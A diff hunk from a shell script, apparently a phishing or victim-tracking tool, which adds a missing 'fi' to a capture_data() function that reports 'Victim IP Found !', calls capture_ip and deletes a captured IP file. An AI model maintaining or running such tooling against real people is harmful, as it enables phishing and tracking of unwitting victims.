@@ -418,7 +418,7 @@ capture_data() {
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
-		
+		fi
 	done
 }
 
